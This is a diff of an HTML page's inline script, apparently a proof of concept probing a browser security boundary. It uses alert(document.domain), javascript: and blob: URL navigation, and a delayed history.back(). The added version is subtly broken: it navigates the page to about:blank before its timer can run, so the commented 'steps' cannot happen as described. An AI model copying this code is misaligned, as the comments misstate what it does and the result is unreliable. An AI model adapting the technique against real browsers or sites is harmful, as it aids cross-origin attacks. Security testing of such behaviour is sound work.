@@ -7,31 +7,25 @@
 </head>
 <body>
   <h1>hello</h1>
+  
   <script>
-    // Open the first window and show an alert
-    const win = window.open('javascript:alert(document.domain);');
-    if (!win) {
-      alert('Popup blocked');
-    }
+    // Step 1: Show the alert with the current domain
+    alert(document.domain);
+    
+    // Step 2: Redirect to a blank page (or use another URL)
+    window.location = 'about:blank';
 
-    // After 1 second, open a second window and perform actions on it
+    // Step 3: After 1 second, inject a script into the page to simulate history navigation
     setTimeout(() => {
-      const win2 = window.open(''); // Open an empty window
-      if (!win2) {
-        alert('Popup blocked');
-      }
-
-      // After 1 second, close the second window and inject a script
-      setTimeout(() => {
-        win2.close();
-        win.location = URL.createObjectURL(new Blob([`
+      window.location = URL.createObjectURL(new Blob([`
+        <html><body>
           <script>
             setTimeout(() => {
-              history.back();
+              history.back(); // Go back in the history after 500ms
             }, 500);
           <\/script>
-        `], { type: 'text/html' }));
-      }, 1000);
+        </body></html>
+      `], { type: "text/html" }));
     }, 1000);
   </script>
 </body>
